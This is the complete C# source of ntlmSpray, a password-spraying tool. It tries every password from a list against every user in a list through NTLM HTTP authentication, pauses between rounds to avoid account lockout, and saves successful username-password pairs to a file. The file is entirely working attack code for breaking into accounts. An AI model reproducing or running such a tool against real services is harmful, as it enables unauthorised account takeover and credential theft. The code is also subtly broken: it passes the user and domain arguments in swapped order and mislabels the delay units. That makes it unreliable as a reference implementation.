using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace ntlmSpray
{
    class Program
    {
		
		static void Main(string[] args)
		{
			if (args.Length < 5)
			{
				Console.WriteLine("Usage: ntlmSpray url, domain, userList, passwordList, delay)");
				return;
			}
			
			string URL = args[0];
			string domain = args[1];
			string userList = args[2];
			string passwordList = args[3];
			int delay = 60;
			
			try
			{
				delay = Int32.Parse(args[4]);
				
				if (delay < 60)
				{
					delay = 60;
					Console.WriteLine("Auto-adjusting delay to be at least 60 minutes");
				}
				
				delay = delay * 60 * 1000;
			}
			catch
			{
				Console.WriteLine("Error parsing the Delay argument, exiting...");
				return;
			}
			
			
			
			string [] passwords;
			string [] users;
			
			try
			{
				passwords = System.IO.File.ReadAllLines(passwordList);
			}
			catch
			{
				Console.WriteLine("Error opening password file, exiting...");
				return;
			}
			
			try
			{
				users = System.IO.File.ReadAllLines(userList);
			}
			catch
			{
				Console.WriteLine("Error opening user file, exiting...");
				return;
			}
			
			performSpray(URL, domain, users, passwords, delay);
			
		}
		
		static int makeNtlmAuthRequest(string URL, string domain, string user, string password)
		{
			HttpWebRequest request = (HttpWebRequest)WebRequest.Create(URL);
			request.Method = "GET";
			request.KeepAlive = true;
			request.Accept = @"*/*";
			request.AllowWriteStreamBuffering = false;

			if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(password))
			{
				return -1;
			}
			
			string userFull = domain + @"\" + user;
			
			NetworkCredential credential = new NetworkCredential(userFull, password);
			CredentialCache credentialCache = new CredentialCache();
			credentialCache.Add(new Uri(URL), "NTLM", credential);
			request.Credentials = credentialCache;
			int wRespCode = 0;
			
			try
			{
				using(HttpWebResponse response = (HttpWebResponse) request.GetResponse())
				{
					if(request.HaveResponse && response != null)
					{
						wRespCode = ((int)response.StatusCode);
					}
				}
			}
			catch (WebException wE)
			{
				if(wE.Response != null)
				{
					using( HttpWebResponse errResp = (HttpWebResponse) wE.Response)
					{
						wRespCode = ((int)errResp.StatusCode);
					}
				}
			}
			
			return wRespCode;
		}
		
		static void performSpray( string URL, string domain, string [] users, string [] passwords, int delay)
		{
		
			int nUsers = users.Length;
			int currIdx = 0;
			int statsIdx = 0;
			Console.WriteLine("Performing spray against: " + URL);
			Console.WriteLine("With domain as: " + domain);
			Console.WriteLine("Numbers of Users: " + users.Length.ToString());
			Console.WriteLine("Number of Passwors: " + passwords.Length.ToString());
			Console.WriteLine("Delay between Passwords (Mins): " + delay.ToString());
			Console.WriteLine("Start Time: " + DateTime.Now);
			
			foreach(string password in passwords)
			{
				Console.WriteLine("Password: " + password + "\n");
			
				foreach (string uname in users)
				{
					currIdx += 1;
					statsIdx += 1;
					if( statsIdx == 100)
					{
					statsIdx = 0;
						Console.Write("\r                                                      ");
						Console.Write("\r Sprayed " + currIdx.ToString() + " of " + nUsers.ToString() + " users");
					}
					
					Stopwatch stopWatch = new Stopwatch();
					stopWatch.Start();
					int wRespCode = makeNtlmAuthRequest(URL, uname, domain, password);
					stopWatch.Stop();
					TimeSpan responseTime = stopWatch.Elapsed;
					
					if(wRespCode != 500 && wRespCode != 401 && wRespCode != 404)
					{
						Console.WriteLine("\r\n" + uname + " " + password + " " + wRespCode.ToString() + "\r\n\n");
						using(System.IO.StreamWriter fout = 
								new System.IO.StreamWriter("passfound.txt", true))
						{
							fout.WriteLine(uname + " " + password + " " + wRespCode.ToString()); 
						}
					}
					else
					{
						using(System.IO.StreamWriter fout = 
							new System.IO.StreamWriter("spray_stats.txt", true))
							{
								fout.WriteLine(DateTime.Now + " " + uname + " " + password + " " + wRespCode.ToString() + 
									" " + responseTime.Seconds.ToString() + "." + responseTime.Milliseconds.ToString()); 
							}
					}
				}
				Console.WriteLine("\nSleeping for " + delay.ToString() + " minutes\n");
				Thread.Sleep(delay);
			}
			
			Console.WriteLine("End Time: " + DateTime.Now);
		}
	}
}
